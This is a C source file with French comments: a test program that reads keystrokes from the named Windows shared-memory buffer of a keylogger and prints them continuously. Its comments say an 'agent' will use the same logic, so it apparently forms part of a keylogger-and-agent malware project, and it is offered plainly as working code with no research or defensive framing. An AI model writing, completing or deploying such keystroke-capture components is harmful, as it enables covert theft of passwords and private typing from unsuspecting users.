// ============================================================================
// SHARED MEMORY READER - Test pour l'agent
// ============================================================================
// Programme de test pour lire la mémoire partagée du keylogger
// L'agent utilisera cette même logique
// ============================================================================

#include <windows.h>
#include <stdio.h>

#define SHARED_MEMORY_NAME "Local\\KeyloggerSharedMem"  // Local = pas besoin d'admin
#define SHARED_BUFFER_SIZE 4096

typedef struct {
    volatile LONG write_index;
    volatile LONG read_index;
    volatile LONG is_active;
    char buffer[SHARED_BUFFER_SIZE];
} SharedKeyloggerData;

int main(void) {
    printf("========================================\n");
    printf("  Shared Memory Reader (Agent Test)\n");
    printf("========================================\n");

    // Ouvrir le fichier mappé existant
    HANDLE hMapFile = OpenFileMappingA(
        FILE_MAP_ALL_ACCESS,
        FALSE,
        SHARED_MEMORY_NAME
    );

    if (hMapFile == NULL) {
        printf("[ERROR] OpenFileMapping failed: %lu\n", GetLastError());
        printf("[INFO] Make sure the keylogger is running first!\n");
        printf("\nPress Enter to exit...\n");
        getchar();
        return -1;
    }

    printf("[+] Shared memory opened successfully\n");

    // Mapper la vue
    SharedKeyloggerData* pData = (SharedKeyloggerData*)MapViewOfFile(
        hMapFile,
        FILE_MAP_ALL_ACCESS,
        0, 0,
        sizeof(SharedKeyloggerData)
    );

    if (pData == NULL) {
        printf("[ERROR] MapViewOfFile failed: %lu\n", GetLastError());
        CloseHandle(hMapFile);
        return -1;
    }

    printf("[+] Memory mapped successfully\n");
    printf("[+] Press Ctrl+C to stop\n");
    printf("========================================\n\n");

    // Boucle de lecture
    LONG last_read_index = pData->read_index;

    while (pData->is_active) {
        LONG write_idx = pData->write_index;
        LONG read_idx = pData->read_index;

        // Si on a des données à lire
        if (read_idx != write_idx) {
            printf("[DATA] ");

            // Lire tous les caractères disponibles
            while (read_idx != write_idx) {
                char c = pData->buffer[read_idx];
                printf("%c", c);

                // Avancer l'index de lecture
                read_idx = (read_idx + 1) % SHARED_BUFFER_SIZE;
            }

            // Mettre à jour l'index de lecture
            InterlockedExchange(&pData->read_index, read_idx);

            fflush(stdout);
        }

        // Petite pause pour ne pas saturer le CPU
        Sleep(100);
    }

    printf("\n[+] Keylogger stopped\n");

    // Cleanup
    UnmapViewOfFile(pData);
    CloseHandle(hMapFile);

    printf("[+] Reader closed\n");
    return 0;
}
